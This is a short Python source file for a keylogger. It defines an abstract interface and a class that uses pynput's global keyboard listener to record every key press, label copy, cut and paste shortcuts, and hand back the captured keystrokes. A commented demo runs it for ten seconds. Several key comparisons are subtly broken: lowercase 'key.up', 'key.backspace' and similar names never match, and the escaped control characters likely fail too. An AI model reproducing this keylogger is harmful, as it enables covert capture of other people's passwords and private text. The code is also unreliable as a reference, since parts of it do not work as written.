from pynput.keyboard import Key, Listener
from abc import ABC, abstractmethod
from typing import List
import time

class IKeyLogger(ABC):
     @abstractmethod
     def start_logging(self) -> None:
        pass

     @abstractmethod
     def stop_logging(self) -> None:
         pass

     @abstractmethod
     def get_logged_keys(self) -> List[str]:
        pass




class keyboard_track(IKeyLogger):
    def __init__(self):
        self.keys = ''
        self.listener = Listener(on_press=self.on_press)



    def on_press(self,key):
        key = str(key).replace("'","")
        if key.isalpha() or key.isnumeric():
            self.keys += key
        elif key == 'Key.space':
            self.keys += 'Key.space'
        elif key == 'Key.enter':
            self.keys += 'Key.enter'
        elif key == 'key.up':
            self.keys += 'key.up'
        elif key == 'key.right':
            self.keys += 'key.right'
        elif key == 'key.left':
            self.keys += 'key.left'
        elif key == 'key.down':
            self.keys += 'key.down'
        elif key == 'key.ctrl_l':
            self.keys += 'key.ctrl_l'
        elif key == '\\x03':
            self.keys += 'copy'
        elif key == 'key.backspace':
            self.keys += 'key.backspace'
        elif key == 'key.\\x18':
            self.keys += 'cut'
        elif key == 'key.\\x16':
            self.keys += 'paste '
        else:
            self.keys += ' {0} '.format(key)


    def start_logging(self) :
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()


    def get_logged_keys(self):
        a = self.keys
        self.keys = ""
        return a


# a = keyboard_track()
# a.start_logging()
# time.sleep(10)
# print(a.get_logged_keys())
